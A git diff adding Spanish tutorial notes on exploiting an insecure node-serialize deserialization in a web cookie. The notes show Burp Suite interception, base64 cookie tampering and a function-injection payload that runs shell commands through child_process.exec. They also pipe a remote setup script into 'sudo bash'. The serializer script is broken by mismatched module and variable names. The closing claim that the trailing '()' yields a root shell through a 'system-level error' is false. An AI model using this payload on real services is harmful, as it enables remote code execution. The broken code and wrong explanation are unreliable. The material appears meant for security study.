@@ -801,6 +801,77 @@ Un atacante puede aprovechar una vulnerabilidad de deserialización para ejecuta
 
 Este ataque consiste en explotar un servicio web que funciona bajo un puerto de la máquina víctima.
 
+Para este ataque nos tenemos que fijar en que al cargar la web haga referencia a un usuario.
+
+Primero abrimos burpsuite y en `Target --> Scope` ponemos como scope lo siguiente: 
+
+```
+http://{ip_de_la_web}:{puerto}
+```
+
+Entonces podemos probar a ir a esa url e interceptar la petición:
+
+`Copiamos la coockie` y por ejemplo con hass identifier o si nos fijamos en que tiene `%3D%3D` podremos intuir que esta en `base 64`, asi que si esta en base 64 lo decodificaremos desde consola asi (sino con otros metodos como con el decoder de burpsuite):
+
+```
+> echo "{coockie}" | base64 -d; echo
+
+> nano data
+```
+
+Y pegamos la coockie decodificada en el archivo `data` y `cambiamos el user`.
+
+```
+> cat data | base64
+```
+
+(si hay un salto de linea  le añadimos: -w 0 ) y copiamos lo que nos haya salido copiamos.
+
+`En burpsuite cambiamos la coockie por esta y le damos a go`, si la referencia al usuario cambia por el user que le hemos puesto podemos pensar que los datos viajan de forma serializada, y una vez el servidor recive la petición la deserializa, por lo que podria ser vulnerable.
+
+Entonces ahora descargaremos un par de herramientas que necesitamos, `SI YA LAS TIENES INSTALADAS SALTATE ESTOS DOS COMANDOS`:
+
+```
+> curl -sL https://deb.nodesource.com/setup_10.x | sudo -E bash -
+
+> apt install nodejs npm -y
+```
+
+Tambien otro par de herramientas que nos podemos crear son las siguientes:
+
+Para serializar un comando (reemplazaremos el comando donde pone {comando}):
+
+```
+> nano serialize.js
+```
+
+Y dentro copiamos el siguiente código:
+
+```js
+var y = {
+	rce : function( ){
+	require('child_process').exec('{comando}', function(error, stdout, stderr) { console.log(stdout) });
+	},
+}
+var serializa = require('node-serializa');
+console.log("Serialized: \n" + serialize.serialize(y));
+```
+
+Para ejecutarlo:
+
+```
+> node serialize.js
+```
+
+Script de deserializacion (el whoami es el comando a ejecutar):
+
+```js
+var serialize = require('node-serialize')
+var payload = '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'whoami\', function(error, stdout, stderr) { console.log(stdout) });}()"}'
+serialize.unserialize(payload)
+```
+
+Sin los últimos `()` es como debería funcionar, pero se descubrio un error a nivel de sistema que hace que si los ponemos directamente nos da una shell de root.
 
 ## PREVENCIÓN
 
